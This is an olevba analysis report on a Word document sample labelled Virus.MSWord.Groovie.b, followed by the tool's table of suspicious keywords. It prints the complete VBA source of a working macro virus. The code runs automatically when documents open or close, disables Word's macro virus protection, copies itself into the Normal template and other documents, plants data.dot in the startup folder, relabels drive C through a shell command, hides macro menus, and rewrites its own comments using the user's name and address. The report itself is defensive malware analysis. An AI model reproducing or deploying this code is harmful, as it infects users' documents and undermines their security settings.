olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-5fd8f4a1adddce77767dcaa7f9731b8e5ea8bbef
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-5fd8f4a1adddce77767dcaa7f9731b8e5ea8bbef - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.b-5fd8f4a1adddce77767dcaa7f9731b8e5ea8bbef - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' K03/11/1999 11:31:45 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Public I02 As Boolean
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Public I03 As Boolean
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Public I04 As Boolean
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Public I05 As Boolean
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Public I06 As String
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Public I07 As Boolean
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Public I08 As Boolean
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Function I09()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
On Error Resume Next
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If MacroContainer = NormalTemplate Then
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        I01 = "normal"
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        GoTo checkout
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    End If
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
checkout:
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Function
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Function I10()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
On Error Resume Next
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        If ActiveDocument.VBProject.VBComponents(I).Name = "groovie" Then I04 = True
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    Next I
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        If NormalTemplate.VBProject.VBComponents(I).Name = "groovie" Then I03 = True
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    Next I
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Function
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Function I11()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
On Error Resume Next
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Call I09
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Call I10
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If I01 = "document" Then Call I12
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If I01 = "normal" Then Call I13
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If I01 = "orbit" Then Call I14
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Function
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Function I12()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
On Error Resume Next
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If I03 = False And I05 = False Then
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        With NormalTemplate.VBProject
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        End With
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        End With
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    End If
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If I02 = False Then
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        Shell ("label c: groovie"), 0
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        Windows(1).Close
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    End If
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Function
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Function I13()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
On Error Resume Next
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Application.ScreenUpdating = False
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    Call I17
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If I04 = False And I07 = True Then
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        With ActiveDocument.VBProject
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        End With
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        End With
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        With Dialogs(wdDialogFileSummaryInfo)
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
            .Comments = "ALT-F11 says it's groovie!"
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
            .Execute
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        End With
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    End If
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If I02 = False And I07 = True Then
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    End If
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If I02 = False And I07 = False Then
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        Documents.Add Template:="", NewTemplate:=False
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    End If
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Application.ScreenUpdating = True
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Function
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Function I14()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
On Error Resume Next
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Application.ScreenUpdating = False
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        If I03 = False And I05 = False Then
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
            With NormalTemplate.VBProject
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
            End With
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
            End With
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
            NormalTemplate.Save
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        End If
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        If I04 = False Then
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
            With ActiveDocument.VBProject
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
            End With
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
            End With
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
            With Dialogs(wdDialogFileSummaryInfo)
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
                .Comments = "ALT-F11 says it's groovie!"
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
                .Execute
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
            End With
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        End If
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Application.ScreenUpdating = True
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Function
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Function I15()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
On Error Resume Next
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    Options.VirusProtection = False
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    Options.SaveNormalPrompt = False
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    Options.ConfirmConversions = False
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    I06 = ActiveDocument.FullName
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    Call I11
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Function
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Sub AutoOpen()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
On Error Resume Next
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Call I15
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Sub
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Sub AutoClose()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
On Error Resume Next
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
I08 = True
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Call I15
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Sub
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Sub AutoExit()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
On Error Resume Next
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Call I15
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Sub
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Sub FileSaveAs()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
On Error Resume Next
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Call I16
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Call I15
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Dialogs(wdDialogFileSaveAs).Show
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Sub
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Sub filesave()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
On Error Resume Next
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Call I16
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Call I15
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Sub
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Sub fileclose()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
On Error Resume Next
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
I08 = True
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Call I15
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
ActiveDocument.Close
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Sub
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Sub fileprint()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
On Error Resume Next
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Call I15
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Dialogs(wdDialogFilePrint).Show
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Sub
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Sub ViewVBCode()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Sub
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Sub ToolsMacro()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Sub
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Sub FileTemplates()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Sub
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Function I17()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
On Error GoTo docek
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    If ActiveDocument.Name <> "" Then
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
        I07 = True
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    End If
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    GoTo over
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
docek:
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
    I07 = False
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
over:
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Function
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Function I16()
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Randomize
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
rn = Int(Rnd * 999)
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").codemodule
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
For x = 2 To 358 Step 2
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
.deletelines x
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
Next x
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End With
 ' K03/11/1999 11:31:46 AM116Saravanan116Wipro LQ-1050+DX on LPT1:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
